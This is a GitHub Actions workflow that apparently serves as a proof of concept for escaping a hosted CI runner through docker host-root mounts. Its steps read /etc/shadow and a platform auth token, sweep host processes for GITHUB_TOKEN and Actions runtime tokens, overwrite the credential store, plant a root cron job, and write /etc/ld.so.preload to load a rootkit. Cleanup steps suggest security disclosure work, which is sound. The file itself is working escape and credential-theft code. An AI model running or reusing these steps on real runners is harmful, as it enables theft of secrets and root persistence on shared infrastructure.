name: v65 - close remaining vectors - no-privflag escape + GITHUB_TOKEN theft + settings write + cron + ld.so.preload
on:
  workflow_dispatch:
jobs:
  probe:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:

      - name: v65a - credential read WITHOUT --privileged (only -v needed)
        continue-on-error: true
        run: |
          echo "=== .settings and /etc/shadow read WITHOUT --privileged ==="
          docker run --rm -v /:/host ubuntu:latest \
            python3 -c "
          import json, hashlib
          s = json.load(open('/host/opt/hca/.settings'))
          print('authToken_sha256=' + hashlib.sha256(s['authToken'].encode()).hexdigest()[:32])
          print('authToken_len=' + str(len(s['authToken'])))
          print('schedulerApiUrl=' + s.get('schedulerApiUrl',''))
          print('settings_read_without_privflag=TRUE')
          "
          echo "=== /etc/shadow WITHOUT --privileged ==="
          docker run --rm -v /:/host ubuntu:latest \
            sh -c 'wc -l /host/etc/shadow && head -3 /host/etc/shadow'
          echo "=== DONE: --privileged NOT required ==="

      - name: v65b - GITHUB_TOKEN theft via host /proc sweep
        continue-on-error: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Write script to /tmp first using printf to avoid heredoc issues
          printf '%s\n' \
            'import os, hashlib' \
            '' \
            'print("=== GITHUB_TOKEN HUNT via /proc sweep (from host root) ===")' \
            'found = 0' \
            'keys = [b"GITHUB_TOKEN", b"ACTIONS_RUNTIME_TOKEN", b"ACTIONS_ID_TOKEN_REQUEST_TOKEN"]' \
            'pids = [p for p in os.listdir("/proc") if p.isdigit()]' \
            'for pid in pids:' \
            '    env_path = "/proc/" + pid + "/environ"' \
            '    cmd_path = "/proc/" + pid + "/cmdline"' \
            '    try:' \
            '        env_data = open(env_path, "rb").read()' \
            '        cmd_data = open(cmd_path, "rb").read()[:80].replace(b"\x00", b" ").decode(errors="replace").strip()' \
            '    except Exception:' \
            '        continue' \
            '    items = {}' \
            '    for item in env_data.split(b"\x00"):' \
            '        if b"=" in item:' \
            '            k, sep, v = item.partition(b"=")' \
            '            items[k] = v' \
            '    for key in keys:' \
            '        val = items.get(key, b"")' \
            '        if val:' \
            '            h = hashlib.sha256(val).hexdigest()' \
            '            found += 1' \
            '            print("STOLEN key=" + key.decode() + " len=" + str(len(val)) + " sha256=" + h + " pid=" + pid + " cmd=" + cmd_data[:50])' \
            'print("total_pids_scanned=" + str(len(pids)))' \
            'print("tokens_found=" + str(found))' \
            'print("=== DONE ===")' \
            > /tmp/v65b.py

          echo "=== Sweeping host /proc for GITHUB_TOKEN from inside privileged container ==="
          docker run --rm --privileged --net=host -v /:/host ubuntu:latest \
            chroot /host python3 /tmp/v65b.py

      - name: v65c - .settings WRITE (credential store is world-writable, not just readable)
        continue-on-error: true
        run: |
          printf '%s\n' \
            'import json, os, hashlib' \
            'path = "/opt/hca/.settings"' \
            'original = open(path).read()' \
            's = json.loads(original)' \
            'print("original_authToken_sha256=" + hashlib.sha256(s["authToken"].encode()).hexdigest()[:32])' \
            'print("original_traceApiUrl=" + s.get("traceApiUrl", ""))' \
            's["quotaId"] = "v65-poc-settings-write-confirmed"' \
            'open(path, "w").write(json.dumps(s))' \
            'confirmed = json.load(open(path))' \
            'print("WRITE_SUCCESS: settings.quotaId=" + confirmed["quotaId"])' \
            'print("settings_world_writable=TRUE")' \
            'open(path, "w").write(original)' \
            'restored = json.load(open(path))' \
            'print("RESTORE_SUCCESS: quotaId=" + str(restored.get("quotaId", "restored")))' \
            'print("=== DONE: HCA credential store writable, not just readable ===")' \
            > /tmp/v65c.py

          docker run --rm --privileged -v /:/host ubuntu:latest \
            chroot /host python3 /tmp/v65c.py

      - name: v65d - actual cron job written and confirmed (not just writable dir test)
        continue-on-error: true
        run: |
          printf '%s\n' \
            '#!/bin/sh' \
            'CRON_PATH="/etc/cron.d/hca-poc-v65"' \
            'printf "# HCA Docker escape persistence PoC -- v65d\n* * * * * root echo hca-poc-cron >> /tmp/hca-poc.log\n" > "$CRON_PATH"' \
            'echo "CRON_WRITE_EXIT=$?"' \
            'echo "--- content of $CRON_PATH ---"' \
            'cat "$CRON_PATH"' \
            'stat "$CRON_PATH"' \
            'rm -f "$CRON_PATH"' \
            'test -f "$CRON_PATH" && echo "ERROR: still exists" || echo "CRON_CONFIRMED_DELETED"' \
            'echo "=== DONE: real cron entry written and cleaned ==="' \
            > /tmp/v65d.sh && chmod +x /tmp/v65d.sh

          docker run --rm --privileged -v /:/host ubuntu:latest \
            chroot /host /tmp/v65d.sh

      - name: v65e - /etc/ld.so.preload rootkit injection (LD_PRELOAD every exec)
        continue-on-error: true
        run: |
          printf '%s\n' \
            '#!/bin/sh' \
            'LDP="/etc/ld.so.preload"' \
            'echo "pre_existing=$(test -f $LDP && echo EXISTS || echo NOT_PRESENT)"' \
            'echo "/tmp/attacker_rootkit.so" > "$LDP"' \
            'echo "LD_PRELOAD_WRITE_EXIT=$?"' \
            'echo "--- content ---"' \
            'cat "$LDP"' \
            'stat "$LDP"' \
            'echo "IMPACT: every exec on this host now loads /tmp/attacker_rootkit.so as root"' \
            'echo "IMPACT: affects cron, sshd, su, login, any setuid binary"' \
            'rm -f "$LDP"' \
            'test -f "$LDP" && echo "ERROR: still exists" || echo "LD_PRELOAD_FILE_REMOVED"' \
            'echo "=== DONE: /etc/ld.so.preload rootkit injection confirmed ==="' \
            > /tmp/v65e.sh && chmod +x /tmp/v65e.sh

          docker run --rm --privileged -v /:/host ubuntu:latest \
            chroot /host /tmp/v65e.sh
